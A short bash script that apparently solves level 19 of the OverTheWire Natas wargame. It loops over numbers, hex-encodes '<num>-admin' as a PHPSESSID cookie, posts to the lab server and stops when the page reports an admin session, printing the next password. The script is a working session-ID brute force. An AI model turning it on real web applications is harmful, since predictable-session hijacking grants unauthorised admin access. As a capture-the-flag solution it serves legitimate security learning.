#!/bin/bash

for ((num=0; num<=1000; num++)); do 
	text="${num}-admin"
	hex=$(printf "%s" "$text" | xxd -p -c 256)
	
	response=$(curl -s -X POST natas19.natas.labs.overthewire.org \
        -u "natas19:NATAS19_PASSWORD" \
        -d "username=admin" \
        -d "password=admin" \
        -b "PHPSESSID=$hex")	

	if grep -q "You are an admin." <<< "$response"; then
		printf "\n The correct session id is: %s\n" "$hex"
		printf "\n%s" "$response" | grep "Password:"
		break
	else
		printf "\n It is not: %s" "$num"
	fi
	
done
